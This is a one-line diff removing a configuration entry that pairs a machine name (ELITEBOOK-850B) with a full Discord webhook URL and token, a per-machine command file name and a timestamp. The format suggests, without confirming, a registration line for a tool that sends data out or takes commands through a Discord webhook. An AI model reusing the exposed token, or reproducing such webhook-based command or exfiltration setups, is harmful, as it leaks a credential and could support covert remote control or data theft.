@@ -1,1 +1,0 @@
-setup:ELITEBOOK-850B:https://discord.com/api/webhooks/1553419324813746356/LUz_i6HWW3qTvpOWjrQ_jPeF3yvMqXTIKohP40yG_oScJ76u8zsw3TOhCQJCiSvf6epu;cmd-elitebook-850b.txt|1790434428
